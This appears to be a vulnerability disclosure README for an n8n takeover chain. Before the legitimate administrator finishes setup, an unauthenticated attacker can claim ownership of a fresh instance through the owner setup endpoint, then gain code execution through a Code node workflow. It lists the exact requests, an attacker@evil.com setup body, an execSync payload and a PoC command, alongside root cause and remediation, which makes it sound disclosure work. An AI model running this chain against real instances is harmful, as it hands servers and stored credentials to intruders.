# n8n Unauthenticated RCE — Fresh Instance Takeover Chain

## Summary

Every n8n instance starts with an unauthenticated owner setup endpoint
(`POST /api/v1/owner/setup`) that allows any network-level attacker to
claim full administrative ownership before the legitimate admin does.
Combined with n8n's Code node, this creates a zero-click, unauthenticated
Remote Code Execution (RCE) chain.

## Affected Versions

All versions with the current owner setup flow (verified on current master).

## Prerequisites

- Network access to the n8n instance (port 5678 by default)
- Instance must not yet have an owner configured (fresh deployment)
- No additional requirements — no API keys, no credentials, no env vars

## Attack Chain

```
Step 1: Detect fresh instance (unauthenticated)
  GET /api/v1/settings
  → Response includes: "showSetupOnFirstLoad": true

Step 2: Claim ownership (unauthenticated → authenticated)
  POST /api/v1/owner/setup
  Body: {"email":"attacker@evil.com","firstName":"A","lastName":"B","password":"Pass1234!"}
  → Response: Sets n8n-auth cookie, returns user object as owner

Step 3: Create malicious workflow (authenticated as owner)
  POST /api/v1/workflows
  Body: Workflow JSON with Code node containing arbitrary JavaScript

Step 4: Activate workflow and trigger via webhook (RCE)
  POST /api/v1/workflows/{id}/activate
  GET /webhook/{webhook-path}
  → Code node executes: require('child_process').execSync('id')
```

## Impact

- **Confidentiality**: Full access to all credentials, workflows, and data
- **Integrity**: Arbitrary modification of workflows, data exfiltration
- **Availability**: Complete system compromise, denial of service
- **RCE**: Arbitrary command execution on the server as the n8n process user

## Root Cause

1. `POST /owner/setup` uses `skipAuth: true` with no additional protection
2. The only guard (`hasInstanceOwner()`) checks if password/lastActiveAt is set
3. Every fresh instance starts with these as NULL — a deliberate design choice
4. No rate limiting, captcha, IP allowlisting, or setup token mechanism
5. The window of vulnerability exists from instance startup until admin setup

## Run the PoC

```bash
# Against a fresh n8n instance at localhost:5678
python3 poc/exploit.py http://localhost:5678
```

## Remediation

- Add a randomized setup token generated at first boot and shown only in server logs
- Require the setup token in the owner setup request
- Add IP allowlisting for the setup endpoint (e.g., localhost-only by default)
- Add a configurable startup delay before the setup endpoint becomes available
